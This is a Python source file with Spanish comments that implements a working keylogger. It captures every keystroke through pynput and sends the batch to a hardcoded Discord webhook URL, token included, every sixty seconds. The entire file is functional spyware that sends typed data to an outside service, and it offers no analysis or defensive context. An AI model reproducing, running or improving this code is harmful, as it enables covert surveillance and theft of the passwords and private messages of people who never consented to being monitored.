from pynput import keyboard
import requests
import time
import threading

# Configura el webhook de Discord
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1196971918759313598/yIrrXm509i0oQ2jxCYal9Gmd1Yk3xXPVnWkWiA3Qllf6NXEoO2OpO6U-3pC003bRArBN"

# Lista para almacenar las pulsaciones
key_events = []
key_events_lock = threading.Lock()

# Función para enviar los datos al webhook de Discord
def send_to_discord(data):
    try:
        payload = {"content": data}
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except requests.RequestException as e:
        print(f"Error al enviar datos a Discord: {e}")

# Función para manejar las pulsaciones de teclas
def on_press(key):
    try:
        with key_events_lock:
            key_events.append(key.char)
    except AttributeError:
        with key_events_lock:
            key_events.append(str(key))

# Función principal para detectar pulsaciones y enviar cada 60 segundos
def main():
    while True:
        try:
            # Configura el escucha de teclado en un hilo
            with keyboard.Listener(on_press=on_press) as listener:
                time.sleep(60)

                with key_events_lock:
                    # Convierte la lista de pulsaciones a una cadena
                    key_data = ', '.join(key_events)

                    # Envía los datos al webhook de Discord
                    send_to_discord(f"Pulsaciones en los últimos 60 segundos:\n{key_data}")

                    # Reinicia la lista de pulsaciones para el próximo intervalo
                    key_events.clear()

        except KeyboardInterrupt:
            # Maneja la interrupción del teclado y envía las pulsaciones capturadas
            with key_events_lock:
                send_to_discord(f"Pulsaciones en los últimos 60 segundos:\n{key_data}")

        except Exception as e:
            print(f"Error general: {e}")
            time.sleep(10)  # Espera antes de intentar nuevamente en caso de error

if __name__ == "__main__":
    main()
